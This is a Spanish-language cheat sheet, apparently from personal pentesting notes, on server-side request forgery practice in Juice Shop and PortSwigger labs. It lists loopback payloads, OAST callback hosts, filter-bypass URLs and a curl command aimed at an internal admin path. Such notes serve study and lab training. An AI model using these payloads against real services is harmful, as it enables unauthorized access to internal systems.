<div align="center">

# 📡 SSRF
### Server-side Request Forgery

</div>

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **Juice Shop** | SSRF challenge |
| **PortSwigger** | SSRF |

---

## 🛠️ Herramientas

- **Caido**: `Replay`
- `interactsh-client`
- `curl`

---

## 🔍 Puntos de Entrada

- check stock
- avatar / image fetch
- webhook tester
- PDF / import URL
- URL preview
- back-end integrations

---

## 🧪 Payloads Base

```text
http://127.0.0.1/
http://localhost/
http://127.0.0.1/admin
http://2130706433/
http://127.1/
```

### OAST

```text
https://<token>.oast.site
https://<token>.oastify.com
```

### Bypass comunes en labs

```text
http://127.0.0.1%252fadmin
http://trusted.example@127.0.0.1/
http://127.0.0.1#trusted.example
```

---

## 🔁 Flujo con Caido

1. Capturar request que acepte URL/host/path.
2. Reenviar a `Replay`.
3. Probar loopback:
   - `127.0.0.1`
   - `localhost`
4. Comparar:
   - status
   - body
   - longitud
   - tiempo
5. Si ciego:
   - usar endpoint OAST controlado

---

## ⚙️ Comandos Útiles

```bash
interactsh-client

curl -i "http://target/product/stock?stockApi=http://127.0.0.1/admin"
```

---

## 🧠 Casos Típicos

| Caso | Señal |
|------|-------|
| **Against server itself** | acceso a `/admin`, `/metrics`, `localhost` |
| **Against internal systems** | puertos internos, metadata, paneles |
| **Blind SSRF** | callback DNS/HTTP sin body visible |
| **Redirect bypass** | app sigue redirección a host bloqueado |

---

## 🧭 Ruta de Práctica

1. PortSwigger: basic SSRF against local server
2. PortSwigger: SSRF with blacklist bypass
3. PortSwigger: SSRF with whitelist bypass
4. PortSwigger: blind SSRF with OAST
5. Juice Shop: SSRF challenge

---

## 📝 Checklist

- parámetro SSRF aislado
- host interno alcanzable o inferido
- bypass documentado
- evidencia OAST guardada si aplica
